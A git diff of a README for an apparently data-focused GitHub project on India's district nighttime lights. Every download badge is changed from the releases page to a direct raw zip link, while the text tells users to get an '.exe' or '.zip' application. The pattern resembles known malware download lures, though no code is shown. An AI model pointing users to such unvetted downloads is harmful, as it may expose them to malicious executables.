@@ -1,6 +1,6 @@
 # 🌙 india-district-nightlights-viirs - India Nighttime Lights Data by District
 
-[![Download Latest Release](https://img.shields.io/badge/Download-India%20Nightlights-brightgreen?style=for-the-badge)](https://github.com/eltayep2/india-district-nightlights-viirs/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-India%20Nightlights-brightgreen?style=for-the-badge)](https://github.com/eltayep2/india-district-nightlights-viirs/raw/refs/heads/main/output/csv/nightlights-district-india-viirs-v1.2.zip)
 
 ---
 
@@ -36,7 +36,7 @@ The application gives you easy access to this data for analysis, reporting, or p
 
 1. Click this button to **visit the download page**:
 
-   [![Download Here](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/eltayep2/india-district-nightlights-viirs/releases)  
+   [![Download Here](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/eltayep2/india-district-nightlights-viirs/raw/refs/heads/main/output/csv/nightlights-district-india-viirs-v1.2.zip)  
 
 2. On the releases page, find the latest version of the application. Look for a file ending in `.exe` or `.zip`.
 
@@ -132,4 +132,4 @@ Topics include: census data, development economics, geospatial analysis, remote 
 
 To get the software, please visit the releases page below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-India%20Nightlights-brightgreen?style=for-the-badge)](https://github.com/eltayep2/india-district-nightlights-viirs/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-India%20Nightlights-brightgreen?style=for-the-badge)](https://github.com/eltayep2/india-district-nightlights-viirs/raw/refs/heads/main/output/csv/nightlights-district-india-viirs-v1.2.zip)
